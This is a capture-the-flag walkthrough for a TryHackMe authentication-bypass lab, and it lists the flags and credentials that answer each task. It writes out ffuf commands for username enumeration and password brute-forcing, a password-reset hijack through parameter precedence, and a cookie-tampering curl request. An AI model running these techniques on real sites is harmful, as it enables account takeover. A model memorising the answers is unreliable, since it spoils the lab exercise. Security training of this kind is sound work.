# Solution

## URL:
- [Authentication Bypass](https://tryhackme.com/room/authenticationbypass)

## Steps

### Task 2:
#### What is the username starting with si*** ?
1. Run the command `fuf -u http://10.10.88.97/customers/signup -X POST -d "username=FUZZ&email=test%40test.com&password=password&cpassword=password" -H "Content-Type: application/x-www-form-urlencoded" -mr "username already exists" -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt | tee valid_usernames.txt`.
2. Answer is in the ouput of the above command: `simon`.

#### What is the username starting with st*** ?
1. Answer is in the ouput of the above command: `steve`.

#### What is the username starting with ro**** ?
1. Answer is in the ouput of the above command: `robert`.


### Task 3:
#### What is the valid username and password (format: username/password)?
1. Run the command: `ffuf -w valid_usernames.txt:USERFUZZ,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:PASSFUZZ -X POST -d "username=USERFUZZ&password=PASSFUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.88.97/customers/login -fc 200`.
2. You will get the answer: `steve/thunder`.

### Task 4:
#### What is the flag from Robert's support ticket?
1. Go to password reset page `/customers/reset`.
2. Type the email `robert@acmeitsupport.thm`.
3. In the next page type the username `robert`.
4. Open network tab in dev tools and send the request.
5. Copy the request as cURL.
6. In the application logic they are using `$_REQUEST` to send the password reset email. `$_REQUEST` is an array that contains data received from the query string and `POST` data and in the application logic it is favoring `POST` data over query string.
7. So if we send the email field in `POST` data as well, we will receive the password reset link.
8. Create an account in the application which will give you a custom email id.
9. Set this email id in the `POST` data of the reset password request with the key `email` and send it.
10. You will receive the email in `Support Tickets` section of your account.
11. Open the link in that email, and check the support ticket in `robert`'s account for the flag: `THM{AUTH_BYPASS_COMPLETE}`.

### Task 6:
#### What is the flag from changing the plain text cookie values?
1. Use the command `curl -H "Cookie: logged_in=true; admin=true" http://10.10.19.215/cookie-test`.
2. Got flag: `THM{COOKIE_TAMPERING}`.

#### What is the value of the md5 hash 3b2a1053e3270077456a79192070aa78 ?
1. Use [crackstation](https://crackstation.net/).
2. Got answer: `463729`.

#### What is the base64 decoded value of VEhNe0JBU0U2NF9FTkNPRElOR30= ?
1. Use command `echo "VEhNe0JBU0U2NF9FTkNPRElOR30=" | base64 -d`.
2. Got flag: `THM{BASE64_ENCODING}`.

#### Encode the following value using base64 {"id":1,"admin":true}
1. Use command `echo '{"id":1,"admin":true}' | base64`.
2. Got flag: `eyJpZCI6MSwiYWRtaW4iOnRydWV9Cg==`.